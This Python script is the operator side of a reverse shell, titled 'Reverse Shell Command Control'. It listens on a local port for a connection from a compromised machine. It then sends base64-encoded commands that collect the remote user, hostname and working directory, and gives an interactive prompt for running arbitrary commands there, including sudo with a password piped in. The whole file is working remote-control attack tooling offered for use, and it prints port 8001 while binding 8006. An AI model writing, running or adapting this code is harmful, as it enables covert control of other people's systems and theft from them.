import socket
import pyfiglet
import os
import base64
from getpass import getpass
"""This function is used to encode the data to be send"""
def en(data):
    return base64.b64encode(data.encode())

"""This is used to decode the instructions arriving from the remote computer"""
def de(data):
    return base64.b64decode(data)

"""This is the driver code"""
def main():
    # Display the initial message
    os.system('tput clear')
    f=pyfiglet.Figlet(font='cybermedium')
    print(f.renderText('Reverse Shell Command Control'))
    print ('\033[1m')
    print("Simplifies command execution on a system with reverse shell access")
    print ('\033[0m')

    # Creating a command center service on a specific port
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('localhost',8006))
    s.listen(2)
    print('Listening on port 8001 for connections...')
    (client, (ip,port))=s.accept()
    print("Received connection from ",ip," port:",port)
    print("Client is:",client)
    flag=0
    while True:
        # Extracting the current working directory
        a=en('pwd')
        client.send(a)
        r1=client.recv(4096).decode()
        r=de(r1).decode()
        currentDirectory='./'
        # Extracting the current user name
        username=en('echo $USER')
        client.send(username)
        u1=client.recv(4096).decode()
        u=de(u1).decode()
        # Extracting the system name
        hostname=en('hostname')
        client.send(hostname)
        h1=client.recv(4096).decode()
        h=de(h1).decode()
        starting='\033[1m ~'+u[:len(u)-2]+'@'+h[:len(h)-2]+':\x1b[2;36;36m'+r[:len(r)-2]+'$\x1b[0m \033[0m'
        # print("Current directory is:",r)
        c=input(starting).strip()
        if not c:
            print("Please enter the command...")
        else:
            # This is the case of sudo command
            if c[:4]=='sudo' and flag==0:
                c=c[:4]+' -S'+c[4:]
                pas=getpass("Enter the user password:")
                c='echo \"'+pas+'\" | '+c
                flag=1

            c=en(c)
            # Sending the encoded command to the remote system
            client.send(c)
            res1=client.recv(4096).decode()
            res=de(res1).decode()
            if res:
                res=res.split('~')
                if res[1]:
                    print(res[1])
                elif res[0]:
                    print(res[0])




if __name__ == '__main__':
    main()
